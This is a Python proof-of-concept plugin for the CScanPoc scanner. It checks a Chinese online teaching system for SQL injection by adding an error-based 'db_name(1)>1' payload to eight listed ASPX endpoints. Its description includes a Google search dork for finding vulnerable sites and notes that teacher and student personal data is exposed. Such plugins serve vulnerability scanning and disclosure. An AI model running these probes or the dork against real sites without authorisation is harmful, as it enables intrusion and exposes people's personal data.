# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'timber2005_0002' # 平台漏洞编号，留空
    name = '天柏网上教学系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-03-16'  # 漏洞公布时间
    desc = '''
        主要针对会计网上学习的。数据库里面包含有很多老师、学生的个人信息。虽然量不是很大，但是个人信息的泄漏估计量还是不少的，分布在全国好几个地区，有部分应该是没有被搜索引擎收录的也有部分是我们下面的那个关键字搜索不到的
        谷歌搜索：
        http://www.google.co.in/search?q=inurl:Course_Default.aspx%3Ftypeid%3D&newwindow=1&filter=0&biw=1366&bih=642
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '天柏在线培训系统'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'cf349bdf-34a2-4ffb-9e10-eb6849857b65'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer:http://www.wooyun.org/bugs/wooyun-2010-053822
            #refer:http://www.wooyun.org/bugs/wooyun-2010-061004
            hh = hackhttp.hackhttp()
            payloads = [
                '/Web_Org/Exam_Info.aspx?infoid=4128',
                '/Web_Org/Tch_info.aspx?infoid=8',
                '/Web_Org/St_Son_Index.aspx?infoid=4015',
                '/Web_Org/New_Info.aspx?infoid=22',
                '/Web_Org/course_info.aspx?infoid=22',
                '/Web_Org/St_Stu_Thinking_Minute.aspx?info=22',
                '/Web_Org/Notice_info.aspx?infoid=22',
                '/Web_Org/Project_Info.aspx?infoid=22'
            ]
            getdata = '%20and%20db_name%281%29%3E1'
            for payload in payloads:
                url = self.target + payload + getdata
                code, head, res, errcode, _ = hh.http(url)
                if code == 500 and 'master' in res :
                    #security_hole(url+'   :found sql Injection')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
